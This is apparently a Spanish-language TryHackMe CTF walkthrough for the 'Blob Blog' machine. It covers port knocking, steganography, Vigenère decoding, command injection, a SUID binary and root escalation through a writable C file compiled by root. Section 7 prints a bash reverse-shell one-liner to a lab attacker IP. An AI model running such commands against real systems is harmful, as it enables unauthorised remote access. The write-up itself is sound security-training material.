# Blob Blog — CTF Writeup

> **Platform:** TryHackMe  
> **Difficulty:** Fácil  
> **OS:** Linux  
> **Machine:** Blob Blog  
> **IP:** `10.67.183.58`

## 📝 Summary

En esta máquina la ruta de compromiso empieza con una enumeración de puertos y servicios. El servidor web del puerto 80 escondía información codificada que llevaba a descubrir un mecanismo de **port knocking**. Después de abrir nuevos puertos, la enumeración permitió conseguir credenciales para FTP y, mediante esteganografía y cifrado Vigenère, obtener las credenciales de Bob.

Con esas credenciales fue posible acceder a una aplicación web en el puerto 8080 que permitía ejecutar comandos. Desde ahí obtuve una shell como `www-data`. Para escalar a un usuario encontré un binario SUID poco habitual, `blogFeeback`, cuyo comportamiento pude analizar con Ghidra. Finalmente, `pspy64` permitió identificar un proceso ejecutado periódicamente como root que compilaba un archivo C escribible por Bob. Modificando ese archivo se consiguió la escalada final a root.

---

## 🔎 1. Reconocimiento

### Nmap

Comencé con un escaneo completo de puertos:

```bash
nmap -sS -p- --min-rate=5000 -Pn -n 10.67.183.58 -oG portus
```

- `-sS`: SYN scan.
- `-p-`: escanea los 65535 puertos.
- `--min-rate=5000`: establece una tasa mínima de paquetes.
- `-Pn`: asume que el host está activo.
- `-n`: evita resolución DNS.
- `-oG portus`: guarda la salida en formato grepable.

Inicialmente encontré:

- **22/tcp — SSH**
- **80/tcp — HTTP**

![Nmap](https://github.com/user-attachments/assets/0a78b6f6-551f-4db4-9e07-5176d3ecd185)

![Nmap results](https://github.com/user-attachments/assets/a7c17223-6c84-45af-afe9-9f50a70323cb)

Por ahora SSH no era especialmente útil porque todavía no tenía credenciales.

---

## 🌐 2. Enumeración del puerto 80

La página web inicial no mostraba nada evidente. La revisión del código fuente sí reveló un bloque codificado.

![Web source](https://github.com/user-attachments/assets/0abc7270-d117-40a2-865c-ac94f1eee5c6)

Decodificando el contenido apareció un mensaje relacionado con **"knock"** y tres números. Esto apuntaba a un mecanismo de port knocking.

El concepto era enviar una secuencia concreta de conexiones para abrir puertos que inicialmente no aparecían en el escaneo.

```bash
knock 10.67.183.58 {puertos, separados por espacio}
```

Después del knocking volví a enumerar la máquina.

![Port knocking](https://github.com/user-attachments/assets/407191e1-68b5-4b86-a5dd-176b2ce25bab)

![New ports](https://github.com/user-attachments/assets/c78232f8-7417-40a8-8db3-c50e9d58136f)

---

## 📁 3. FTP y búsqueda de credenciales

Uno de los servicios descubiertos posteriormente fue FTP.

La conexión anónima estaba deshabilitada, así que continué investigando el servicio web y su código fuente. La enumeración reveló información adicional relacionada con las credenciales.

![FTP / credentials](https://github.com/user-attachments/assets/112be328-6dc9-40a6-89ff-bf414c40a5e9)

La información obtenida permitió identificar al usuario **Bob** y conseguir la contraseña después de decodificarla.

Con las credenciales pude acceder al FTP.

---

## 🕵️ 4. Esteganografía

Entre los archivos disponibles encontré una imagen que podía contener información oculta.

Al intentar analizarla con `steghide`, la herramienta solicitó una contraseña. Esto fue otra señal de que todavía faltaba encontrar información durante la enumeración.

La contraseña apareció posteriormente al revisar otro servicio HTTP.

```bash
steghide extract -sf cool.jpeg
```

![Steghide](https://github.com/user-attachments/assets/5afb99b4-0d9c-41a5-bf23-135e1ae22f69)

El contenido extraído parecía ser un texto cifrado y también daba una pista relacionada con un directorio.

---

## 🔐 5. Vigenère y credenciales de Bob

Uno de los servicios descubiertos utilizaba el puerto **445**, pero en esta máquina no correspondía a SMB sino a HTTP.

Con `dirsearch` encontré una ruta interesante:

```bash
dirsearch -u 10.67.183.58:445 -e * -r
```

La revisión del código fuente de esa ruta proporcionó otra contraseña que podía utilizarse con la imagen.

![Enumeration](https://github.com/user-attachments/assets/ba6fe7d7-7a35-4bb7-91ef-5a387fa7dcf3)

El resultado extraído tenía apariencia de texto cifrado con **Vigenère**. También había una referencia a un directorio.

Al probar la información obtenida contra los servicios HTTP apareció **Bob's drawer**, que proporcionó el dato necesario para utilizarlo como clave Vigenère.

Después de descifrarlo obtuve las credenciales de Bob.

![Vigenère result](https://github.com/user-attachments/assets/4a57c94c-5e8e-4bcf-b923-ef5c6c3080a4)

---

## 💻 6. Aplicación web — Puerto 8080

El puerto **8080** mostraba otra aplicación HTTP basada en Apache.

Para enumerar sus rutas utilicé:

```bash
python3 /opt/dirsearch/dirsearch.py -u 10.67.183.58:8080 -e * -r
```

Las rutas encontradas redirigían a un login. Las credenciales de Bob funcionaron.

![Port 8080](https://github.com/user-attachments/assets/98263c4d-4efe-44a6-bd88-9eec2c631b46)

Después de iniciar sesión encontré una página de review con un campo de entrada. Al probar comandos básicos, observé que la salida aparecía reflejada en la página.

Por ejemplo, una prueba con:

```bash
ls
```

confirmó que la aplicación estaba ejecutando comandos.

![Command execution](https://github.com/user-attachments/assets/e24765f6-75d5-4e02-9c4a-4a2aea77a0ad)

---

## 🐚 7. Acceso inicial — Reverse Shell

Con la ejecución de comandos confirmada, utilicé una reverse shell en el laboratorio:

```bash
bash -i >& /dev/tcp/10.9.1.161/4444 0>&1
```

Esto permitió obtener una shell en la máquina como **www-data**.

![Initial shell](https://github.com/user-attachments/assets/c70a6a83-25db-435d-b99b-655d17c90eab)

Después mejoré la terminal:

```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

Luego:

```text
Ctrl+Z
stty raw -echo
fg
fg
export TERM=xterm-256color
```

![Shell](https://github.com/user-attachments/assets/0461806b-6696-43d7-9e82-9bc81c188d3c)

---

## ⬆️ 8. Escalada a usuario

Como `www-data`, `sudo -l` no mostró privilegios útiles.

Continué con una búsqueda de binarios SUID:

```bash
find / -perm -4000 2>/dev/null
```

Entre los resultados apareció un binario poco habitual llamado:

```text
blogFeeback
```

![SUID enumeration](https://github.com/user-attachments/assets/a9cd5c6a-abc7-4c8d-80db-c56e13a94eab)

Para entender su comportamiento transferí el binario a mi máquina y lo analicé con **Ghidra**.

El análisis mostró un bucle de 1 a 7 que comparaba `7 - iteration` con los argumentos recibidos. Además, `iVar1` avanzaba sobre los argumentos, indicando que el programa esperaba varios parámetros en un orden concreto.

La secuencia correcta permitió obtener acceso como el usuario de la máquina.

![Ghidra analysis](https://github.com/user-attachments/assets/196b3dcb-ee8a-4fe0-a9d7-fdae456f5b33)

---

## 👑 9. Escalada a root

Después de obtener el acceso como usuario, empecé a investigar un comportamiento extraño: aparecía periódicamente un mensaje en la terminal.

La crontab normal no explicaba ese comportamiento, así que utilicé **pspy64** para observar procesos ejecutados en segundo plano.

```bash
chmod +x pspy64
./pspy64
```

![pspy](https://github.com/user-attachments/assets/ac98c82c-ac8f-418c-af62-79e814e31e40)

pspy reveló un proceso muy interesante:

```text
/bin/sh -c gcc /home/bobloblaw/Documents/.boring_file.c -o /home/bobloblaw/Documents/.also_boring/.still_boring && chmod +x /home/bobloblaw/Documents/.also_boring/.still_boring && /home/bobloblaw/Documents/.also_boring/.still_boring | tee /dev/pts/0 /dev/pts/1 /dev/pts/2 && rm /home/bobloblaw/.also_boring/.still_boring
```

La cadena hacía varias cosas:

1. Compilaba `.boring_file.c`.
2. Generaba un ejecutable.
3. Le daba permisos de ejecución.
4. Ejecutaba el binario.
5. Eliminaba el archivo generado.

Lo más importante era que el proceso se ejecutaba con privilegios de **root** y el archivo C podía ser modificado por el usuario.

![Cron process](https://github.com/user-attachments/assets/770c?dummy=1)

Por tanto, la superficie de escalada estaba en el archivo:

```text
/home/bobloblaw/Documents/.boring_file.c
```

Al reemplazar su contenido por código que permitiera obtener una shell con los privilegios del proceso y esperar a la siguiente ejecución programada, fue posible conseguir acceso como **root**.

![Root](https://github.com/user-attachments/assets/196b3dcb-ee8a-4fe0-a9d7-fdae456f5b33)

---

## 🏁 10. Flags

### User Flag

El acceso al usuario se consiguió después de analizar el binario SUID `blogFeeback` y proporcionar los argumentos esperados por el programa.

![User flag](https://github.com/user-attachments/assets/160337?dummy=1)

### Root Flag

La escalada final se consiguió aprovechando el archivo C escribible que era compilado y ejecutado periódicamente por un proceso con privilegios de root.

---

## 🧠 What I Learned

- No asumir que un puerto concreto necesariamente ejecuta el servicio esperado; hay que enumerarlo.
- Revisar siempre el código fuente de las aplicaciones web.
- La información codificada puede contener pistas para continuar la enumeración.
- El **port knocking** puede ocultar servicios que no aparecen en el primer escaneo.
- Las imágenes pueden contener información mediante esteganografía.
- Vigenère puede aparecer como una segunda capa después de extraer información de un archivo.
- Un binario SUID desconocido merece investigación, no solo una lista de permisos.
- Ghidra ayuda a entender la lógica de binarios cuando no tenemos el código fuente.
- `pspy` es útil para descubrir procesos programados que no aparecen claramente en la crontab.
- Un archivo modificable que posteriormente es compilado y ejecutado por root puede convertirse en una vía de escalada.

## 🛠️ Tools Used

- Nmap
- Knock
- Dirsearch
- FTP
- Steghide
- CyberChef
- Cryptii
- Ghidra
- pspy64
- Python
- Bash

---

## 📌 Evidencias

Las capturas utilizadas en esta documentación corresponden al proceso de resolución de Blob Blog y están colocadas junto a las etapas donde aportan contexto visual.
